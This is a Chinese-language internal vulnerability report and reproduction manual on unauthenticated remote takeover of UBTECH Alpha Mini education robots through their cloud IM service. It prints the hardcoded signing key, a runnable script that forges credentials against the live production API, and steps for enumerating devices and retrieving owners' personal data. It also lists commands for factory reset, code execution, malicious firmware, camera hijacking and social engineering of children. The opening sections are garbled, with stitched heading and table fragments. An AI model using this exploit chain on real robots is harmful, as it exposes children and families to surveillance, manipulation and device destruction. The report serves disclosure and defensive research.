---
编号: UBW-002
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 优必选AI悟空EDU
源候选目录: 云端任意机器人未授权控制
---
# UBW-002 UBTECH 悟空（Alpha Mini）云 IM 链未授权远程控制 — 完整分析与复现手册

## 1. 一句话结论

- # UBTECH 悟空（Alpha Mini）云 IM 链未授权远程控制 — 完整分析与复现手册
- ## 1. 执行摘要
- **只需一个机器人序列号（SN），无需任何账号、无需与目标处于同一网络，攻击者即可从互联网任意位置对在线悟空机器人执行任意远程命令。** 该结论已在本团队自有设备上完整实机闭环，非理论推演。
- 严重度定级：**严重（Critical）**——未授权、广域网可达、可规模化、波及儿童用户群体的隐私与物理安全。
- ## 2. 危害全景

## 2. 影响产品与版本

- > 版本：2026-07-31 · 环境：SRC 授权测试环境 · 实证设备：自有悟空教育版（SN=<其他机器人设备_01>, fw v1.6.3.919）
- - **5 条产品线**的固件经同一签名体系公网可下载（其中 3 条含完整系统 OTA）。
- - **cmd 313/314（OTA 下载并升级）**：命令机器人下载安装升级包。该设备 OTA 验签信任根为 **AOSP 公开测试密钥**（任何人可下载私钥），攻击者可自签恶意固件推送安装，改写 preloader/LK/TEE——**恢复出厂也无法清除的机队级持久化**。
- `im/getInfo` 是 UBTECH 云为 App/机器人签发腾讯 IM 登录凭据（userSig）的接口，其唯一防护是客户端硬编码的静态密钥 `MD5("IM$SeCrET"+time)`——**任何人可从公开 App/固件中恢复，且服务端不校验时间窗（24 小时前的签名照样放行）、不校验账号存在性、无频率限制**。实测三个 IM 租户（1400032988 / 1400059787 / 1400031700）全部可用伪造凭据登录腾讯 IM 生产环境。这意味着该厂商消费级产品线的 IM 身份体系是**系统性失效**，不是单点漏洞。
- - **悟空 2 代**：IM 租户伪造登录已实证；固件同构（`persist.mini.sid` + 机器人拿 sid 查绑定），全链适用为强推断；
- - **AlphaMini 标准版（X100）**：大概率落入默认租户（已实证可伪造登录），系统固件 1.26 GB 已下载待验证；

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- ## 3. 漏洞根因（六环机制）
- > **服务端不校验时间窗（24h 已验证）——以下请求生成一次可无限重放。**
- \| 现象 \| 原因与处理 \|
- 3. **机器人固件（纵深）**：IM 派发前校验发送方绑定关系；高危命令（370/365/316/312–315）二次认证+防重放；OTA 更换公开测试密钥。

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- # UBTECH 悟空（Alpha Mini）云 IM 链未授权远程控制 — 完整分析与复现手册
- 严重度定级：**严重（Critical）**——未授权、广域网可达、可规模化、波及儿童用户群体的隐私与物理安全。
- ## 2. 危害全景
- ### 2.2 持久化完全控制：从一条消息到 rootkit
- - **cmd 704–709（RTAV 视频房间）**：让机器人开启实时音视频房间，**cmd 707 远程控制机器人动作**。机器人由此变成攻击者安插在儿童卧室里的遥控摄像头+麦克风。
- ### 2.4 针对儿童的社工欺诈通道（本产品最特殊的危害）

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# UBTECH 悟空（Alpha Mini）云 IM 链未授权远程控制 — 完整分析与复现手册

> 版本：2026-07-31 · 环境：SRC 授权测试环境 · 实证设备：自有悟空教育版（SN=<其他机器人设备_01>, fw v1.6.3.919）
> **边界声明**：全部命令执行仅针对本团队自有机器人；对第三方设备仅做过只读在线状态查询，
> 未投递任何消息、未伪造其凭据、未读取其数据。本手册仅供防御研究与负责任披露使用。

---

## 1. 执行摘要

**只需一个机器人序列号（SN），无需任何账号、无需与目标处于同一网络，攻击者即可从互联网任意位置对在线悟空机器人执行任意远程命令。** 该结论已在本团队自有设备上完整实机闭环，非理论推演。

关键数字：

- **6 个环节**构成的攻击链，全部实机实证；
- **~110 个**远程命令 handler 零鉴权可达（含恢复出厂、Lua 代码执行、OTA 刷机、视频房间）；
- **3 个腾讯 IM 租户**被同一把硬编码静态密钥通签（覆盖悟空 1 代教育版、2 代、默认产品线）；
- **50%** 的 SN 号段密度（抽样 101 个命中 50 台真实设备），全网在线设备可云端枚举；
- **5 条产品线**的固件经同一签名体系公网可下载（其中 3 条含完整系统 OTA）。

严重度定级：**严重（Critical）**——未授权、广域网可达、可规模化、波及儿童用户群体的隐私与物理安全。

---

## 2. 危害全景

### 2.1 规模化破坏：全网设备批量变砖

攻击链的每一个前提都是机械可枚举的：SN 格式 `<其他机器人设备_01> + 8 位数字`，经 `im/isOnline` 接口（支持批量 20 个/次，实测三态准确）可低成本扫描出全网在线设备清单。抽样实测：以一台已知设备为中心 ±50 的 101 个候选中命中 **50 台真实设备**（密度约 50%）。

拿到清单后，对每台设备发送 **cmd 370（恢复出厂）** 或 **cmd 371（清除隐私数据）**，即可在一夜之间将在线设备批量清空解绑。这不是理论场景：命令通道与已实证的 cmd 68/99/108 走同一个零校验派发器，厂商侧没有任何速率限制或来源校验。

### 2.2 持久化完全控制：从一条消息到 rootkit

- **cmd 365（DemoRunLuaScript）**：在机器人上执行任意 Lua。同 handler 在局域网通道已被证明可通过 `luajava` 反射调用 `Runtime.exec` 获得 **system 身份 shell**（本工作区局域网攻击面 U-30 已实证）。经广域网 IM 触发同一代码路径，攻击者可在任意受害者机器人上植入持久化后门，机器人沦为家庭/学校内网跳板。
- **cmd 313/314（OTA 下载并升级）**：命令机器人下载安装升级包。该设备 OTA 验签信任根为 **AOSP 公开测试密钥**（任何人可下载私钥），攻击者可自签恶意固件推送安装，改写 preloader/LK/TEE——**恢复出厂也无法清除的机队级持久化**。
- **cmd 316（ADB 开关）**：远程开启调试接口。

### 2.3 侵入家庭物理空间：摄像头、麦克风与远程动作

- **cmd 704–709（RTAV 视频房间）**：让机器人开启实时音视频房间，**cmd 707 远程控制机器人动作**。机器人由此变成攻击者安插在儿童卧室里的遥控摄像头+麦克风。
- **cmd 109（取声网房间凭据）**：已实测零鉴权可达——受害者正在进行视频看护时，攻击者可取走房间频道与凭据，**加入他人正在进行的视频通话**实时窥视。
- **SetCameraPrivacyHandler**：远程关闭摄像头隐私模式。

### 2.4 针对儿童的社工欺诈通道（本产品最特殊的危害）

悟空是**儿童教育机器人**，其核心使用场景是孩子通过机器人呼叫父母。已实证的两个原语组合出前所未有的社工面：

1. **cmd 120（导入联系人）**：陌生账号可向机器人通讯录注入任意"姓名+号码"。已实测写入 `WANTEST/13800138000` 成功。将号码命名为"爸爸"后，**孩子"给爸爸打电话"接通的是攻击者**。
2. **cmd 91（TTS 语音合成）**：让机器人对身边的儿童说出任意内容（已实测投递成功）。机器人是孩子信任的"伙伴"，以其口吻实施的诱导（套取家庭信息、引导线下行动）几乎没有防备成本。

### 2.5 敏感数据批量窃取（零凭据）

| 数据 | 通道 | 实证状态 |
|---|---|---|
| 机主账号 PII（userId/用户名/昵称/微信头像/绑定时间） | 云端 `relation/getBindUsers?robotUserId=<SN>`，**无 token** | 已实证 |
| 通讯录明文手机号 / 通话记录 | cmd 121 / 125（IM 零鉴权） | 管道全环实证（自投数据回读） |
| 已注册人脸数据 | cmd 116 | handler 执行实证（本机为空） |
| 相册列表/照片 | cmd 112 / 111 / 53 | 代码实证，同路径 |
| 紧急联系人号码 | cmd 324 | 代码实证 |
| 腾讯叮当 TVS 产品凭据（**全产品线共享一枚**） | cmd 108 回包明文 | 已实证 |
| 机器人实时位置网络（当前 IP） | cmd 311 | 代码实证 |
| 设备注册信息与在线状态 | `equipment/listBySerialNum` / `im/isOnline` | 已实证 |

注：教育版无实名认证体系，**身份证号不在攻击面内**（全源码树核实，避免夸大）。

### 2.6 凭据体系系统性失效（危害的根）

`im/getInfo` 是 UBTECH 云为 App/机器人签发腾讯 IM 登录凭据（userSig）的接口，其唯一防护是客户端硬编码的静态密钥 `MD5("IM$SeCrET"+time)`——**任何人可从公开 App/固件中恢复，且服务端不校验时间窗（24 小时前的签名照样放行）、不校验账号存在性、无频率限制**。实测三个 IM 租户（1400032988 / 1400059787 / 1400031700）全部可用伪造凭据登录腾讯 IM 生产环境。这意味着该厂商消费级产品线的 IM 身份体系是**系统性失效**，不是单点漏洞。

### 2.7 产品线蔓延

- **悟空 2 代**：IM 租户伪造登录已实证；固件同构（`persist.mini.sid` + 机器人拿 sid 查绑定），全链适用为强推断；
- **AlphaMini 标准版（X100）**：大概率落入默认租户（已实证可伪造登录），系统固件 1.26 GB 已下载待验证；
- **固件供应链面**：5 条产品线（AlphaMini/AlphaMini2/AlphaMiniInEdu/Yanshee×2）的升级包经同一静态签名公网可下，为后续各线固件分析敞开大门。

---

## 3. 漏洞根因（六环机制）

```
SN（mDNS/BLE 广播 / 号段云端枚举）
 ① im/getInfo 伪造 userSig   静态密钥 MD5("IM$SeCrET"+time)，无鉴权、无时间窗、不存在账号照签
 ② 登录腾讯 IM               腾讯接受该 userSig（SDKAppID=1400032988）
 ③ C2C 消息投递              该 SDKAppID 未开启关系链校验，陌生人可直发机器人
 ④ 机器人侧零发送方校验       peer 仅作回包地址，不与绑定关系比对（U-33 两端代码实证）
 ⑤ ~110 handler 派发执行      含 365 Lua / 370 恢复出厂 / 312-315 OTA / 704-709 RTAV / 316 ADB
 ⑥ 响应沿 IM 返回攻击者       responseSerial 与请求一一对应
```

关键证据锚点：

| 环节 | 证据 |
|---|---|
| 静态密钥 | App `com/common/channel/security/Auth.java`；机器人 `TencentIMManager.java:226`（两端同密钥） |
| 机器人 IM id = SN | `Robot2PhoneMsgMgr.java:22` → `persist.mini.sid`（实机 getprop 验证） |
| 零发送方校验 | `RobotPhoneCommuniteProxy`：peer 只用于回传，无白名单/绑定比对 |
| 命令注册表 | `ImProtoLiteMsgRelation.java`（~110 handler）、`IMCmdId.java`（命令号） |

---

## 4. 受影响范围

| 产品线 | 标识 | 状态 |
|---|---|---|
| 悟空教育版（AlphaMiniInEdu） | SDKAppID 1400032988 | **全链实机实证** |
| 悟空 2 代（AlphaMini2/WK2） | SDKAppID 1400059787 | 伪造登录实证；全链强推断（固件同构） |
| 默认产品线（疑 AlphaMini 标准版 X100 等） | SDKAppID 1400031700 | 伪造登录实证 |
| OTA/固件面 | upgrade.ubtrobot.com | 5 条产品线固件公网可下（X100/WK2/InEdu 含完整系统 OTA） |
| Jimu / Cruzr / Walker / Yanshee 系统等 | — | 不在此 OTA/IM 体系，无证据卷入 |

---

## 5. 复现环境

- 一台能上网的电脑（Windows/Linux/macOS 均可），Node.js ≥ 18，Python 3 + `requests`；
- 一台**自有**悟空机器人（开机联网即可，无需同网段）；验证落地效果需要机器人 shell（本包 `robot_ssh.py`，按你环境的 SSH 参数调整）；
- Burp 复现只需 Burp Suite（见 `BURP_GUIDE.md`），脚本复现只需 Node。

## 6. 详细复现步骤

### 阶段 A：云端四连（纯 HTTP，Burp/curl 均可）

> 签名算法：`signature = MD5("IM$SeCrET" + 毫秒时间戳)`；`X-UBT-Sign = MD5(秒级ts + appKey + nonce + deviceId) + " ts nonce v2"`。
> **服务端不校验时间窗（24h 已验证）——以下请求生成一次可无限重放。**
> 一键生成四段带新鲜签名的 raw 请求：`python scripts/burp_gen_request.py`

**A1. 伪造任意账号的 IM 登录凭据（核心漏洞）**

```bash
python - << 'EOF'
import hashlib, time, requests, urllib3
urllib3.disable_warnings()
t = str(int(time.time()*1000))
sig = hashlib.md5(('IM$SeCrET'+t).encode()).hexdigest()
r = requests.get('https://apis.ubtrobot.com/im/getInfo',
    params={'signature': sig, 'time': t,
            'userId': 'poc_never_registered_001',   # ← 从未注册的账号，换成谁签谁
            'channel': 'MINIEDUCN'}, timeout=15, verify=False)
print(r.status_code, r.text[:200])
EOF
```

预期：`200 {"returnCode":"0",...,"userSig":"eJxl..."}` —— 云端对不存在的账号照签凭据。

**A2. 全网在线设备枚举**

同上签名，请求 `GET https://apis.ubtrobot.com/im/isOnline?...&accounts=<SN1>,<SN2>,...`（逗号批量，实测 20/次）。
预期：`{"...SN_real":"Online"/"Offline", "...SN_fake":""}` 三态区分。
批量抽样脚本：`python evidence/scan_online_sample.py`。

**A3. SN → 机主 PII（零 token）**

```http
GET https://internal.ubtrobot.com/v1/minieducn/relation/getBindUsers?robotUserId=<自有机器人SN>
X-UBT-AppId: 100020114
X-UBT-DeviceId: <任意字符串>
X-UBT-Sign: <按上式计算>
```

预期：返回机主 `userId/userName/nickName/userImage(微信头像)/relationDate`（参考 `evidence/relation_getBindUsers_redacted.json`）。

**A4. SN → 设备注册信息**

`POST https://prodapi.ubtrobot.com/equipment/equipment/listBySerialNum`，JSON body `{"serialNum":"<SN>"}`，同样仅 X-UBT 静态签名（注意 Content-Length 须与 body 一致）。

### 阶段 B：IM 全链一键（伪造→登录→枚举→远控回包）

```bash
cd scripts
npm install          # 已内置 node_modules 可跳过
node run_full_chain.js <其他机器人设备_01>     # 换成你的机器人 SN
```

预期输出（实录：`evidence/full_chain_run_*.log`，截图：`screenshots/01_full_chain.png`）：

```
[步骤1] im/getInfo ... returnCode=0  SDKAppID=1400032988  userSig=eJxl...
[步骤2] 腾讯 IM 登录: actionStatus=OK  tinyID=144115...
[步骤3] im/isOnline 批量枚举: 目标 -> Online
[步骤4] C2C 投递 cmd 68(查询电量): status=success
[!!!] 机器人回包: 电量=63%  固件=v1.6.3.919
[结论] 陌生账号 → 云端伪造凭据 → 腾讯 IM → 机器人零校验执行 → 回包。全链闭环。
```

### 阶段 C：专项 PoC（均在 scripts/，用法 `node <脚本> <伪造账号> <SN>`）

| 脚本 | 演示内容 |
|---|---|
| `run_full_chain.js` | ★ 一键全链（建议第一个跑） |
| `im_hijack_test.js` | 顶号机器人本尊：以其 SN 伪造身份登录，接管/监听其 IM 会话 |
| `im_send_test.js` | 陌生账号 C2C 投递验证（关系链校验未开启） |
| `im_control_test.js` | 三连：cmd 108 取 TVS 云凭据 / cmd 116 人脸列表 / cmd 99 写主人昵称 |
| `im_contact_pii.js` | cmd 120 注入联系人 + cmd 121 回读通讯录手机号 + cmd 125 通话记录 |
| `im_speak_test.js` | cmd 91 TTS 让机器人说任意内容 |
| `im_rtav_test.js` | cmd 109 取视频房间凭据 + cmd 116 人脸列表 |
| `im_tenant_login.js` | 多租户伪造登录（ALPHAMINI=悟空2代 / 任意=默认租户） |

### 阶段 D：机器人侧落地验证

```bash
python scripts/robot_ssh.py "grep -ri MASTER_NAME /data/data/*/shared_prefs/"   # 验证 cmd 99 写入
python scripts/robot_ssh.py "getprop persist.mini.sid"                          # 验证 IM id = SN
```

### 排错表

| 现象 | 原因与处理 |
|---|---|
| `im/getInfo` 返回非 0 | 签名算错：确认是 `MD5("IM$SeCrET"+毫秒时间戳)`（毫秒，不是秒） |
| Node 脚本登录失败 | `npm install` 未跑；或机器人/网络到 `wss.im.qcloud.com` 不通 |
| cmd>127 发不出去 | 已知限制：web SDK 字符串传输会损坏 >0x7F 字节；换腾讯 Android SDK（`sendMessage(byte[])`）即可，属工具问题非防护 |
| 机器人无回包 | 机器人离线（先 `im/isOnline` 查）；或该 handler 设计上无回包（如 cmd 91） |
| prodapi 400 | Content-Length 与 body 不一致（前置 SLB 严格校验） |

---

## 7. 能力矩阵（同一零鉴权 dispatcher，证据等级分明）

| 命令 | 效果 | 证据等级 |
|---|---|---|
| cmd 68 查电量 | 回包电量+固件版本 | **实机实证** |
| cmd 108 取 TVS 凭据 | 回包全线共享云凭据 | **实机实证** |
| cmd 99 写主人昵称 | 配置落盘 | **实机实证**（SSH 验证） |
| cmd 120/121/125 | 通讯录注入/导出/通话记录 | **实机实证**（假数据全环） |
| cmd 116/112/111 | 人脸/相册 PII | handler 执行实证（本机无数据） |
| cmd 109 | 视频房间凭据 | handler 执行实证（本机无活动房间） |
| cmd 91 TTS | 机器人说话 | 投递实证（无回包设计） |
| cmd 365 Lua 执行 | system 级代码执行 | 代码实证（LAN 同 handler 已拿 shell） |
| cmd 370/371 恢复出厂/清数据 | 设备清空 | 代码实证（破坏性未执行） |
| cmd 312–315 OTA | 刷机（配公开信任根=恶意固件） | 代码实证 |
| cmd 704–709 RTAV | 视频开播+远程动作 | 代码实证 |
| cmd 316 开 ADB | 调试面 | 代码实证 |
| NetConnectOneWifi | 下发恶意 WiFi→流量接管 | 代码实证 |

## 8. 证据与文件索引

```
cloud_im_rce_package/
├── README.md                        ← 本手册
├── BURP_GUIDE.md                    ← Burp Repeater 专项复现指南
├── evidence/                        ← 证据（19 组，详见 evidence_im_chain_20260731.log）
│   ├── evidence_im_chain_20260731.log
│   ├── full_chain_run_20260731_124027.log      一键全链实录
│   ├── relation_getBindUsers_redacted.json     SN→机主PII（脱敏）
│   ├── online_sample_scan_20260731_125356.log  枚举密度实测（50/101）
│   ├── ota_enum_20260731_134711.json           OTA 产品线枚举原始数据
│   ├── ota_firmware_urls_verified.json         10 个固件 URL 验证（MD5/大小）
│   ├── firmware/                               已下载固件（X100 1.26GB 等 3 件）
│   └── *.py                                    各证据的生成脚本（可复跑）
├── screenshots/                     ← 终端截图 6 张（00-05）+ Burp 实测截图 4 张（06-09）+ 渲染器
│      06=im/getInfo 伪造凭据  07=isOnline 三态枚举
│      08=getBindUsers 自有机器人  09=getBindUsers 第三方机器人（含真实机主 PII，
│      ★ 对外提交前务必打码：昵称/头像/userId，或仅保留内部存档）
└── scripts/                         ← 全部 PoC（node_modules 已装，开箱即用）
```

## 9. 修复建议

1. **UBTECH 云端（治本）**：`im/getInfo` 增加调用方身份鉴权与 userId 归属校验；全业务 API 做对象级授权；废弃 `IM$SeCrET` 并轮换全部已签发凭据；更换全线共享的 TVS 默认凭据（按设备下发）；OTA 接口按 productName 做凭据隔离。
2. **腾讯 IM 控制台（止血）**：为三个受影响 SDKAppID 开启关系链校验；核查并保护 REST API 管理员账号。
3. **机器人固件（纵深）**：IM 派发前校验发送方绑定关系；高危命令（370/365/316/312–315）二次认证+防重放；OTA 更换公开测试密钥。

---

*本手册所有结论均可在授权环境复现；引用时请注明证据等级（实机实证 / 代码实证 / 强推断）。*
